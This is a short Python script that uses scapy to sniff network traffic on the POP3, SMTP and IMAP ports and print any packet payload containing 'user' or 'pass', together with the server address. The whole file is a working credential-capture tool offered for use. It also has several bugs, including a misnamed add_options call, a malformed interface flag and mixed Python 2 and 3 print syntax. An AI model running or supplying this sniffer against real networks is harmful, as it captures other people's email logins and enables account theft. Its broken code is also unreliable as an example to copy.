from scapy.all import *
import time
from optparse import OptionParser
#supress annoying scapy IPv6 warnings
import requests.packages.urllib3
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

parser = OptionParser(usage="usage: sudo %prog [options]")
parser.add_option("-t", "--time", action="store", dest="time", default=100, type=int, help="Total time to sniff packets.")
parser.add_options("-i", "-interface", action="store", dest="iface", default="wlan0", help="Interface to use. Default: wlan0.")
(options, args) = parser.parse_args()

intface = options.iface
time = options.time


#packet callback
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload


print('[*] Running for %i seconds...' % options.time)


#start sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=time, iface=intface)
#port 110 = POP3
#port 143 = IMAP
#port 25  = SMTP
print("[!] Scanner has finished after %i seconds." % options.time)
exit(0)
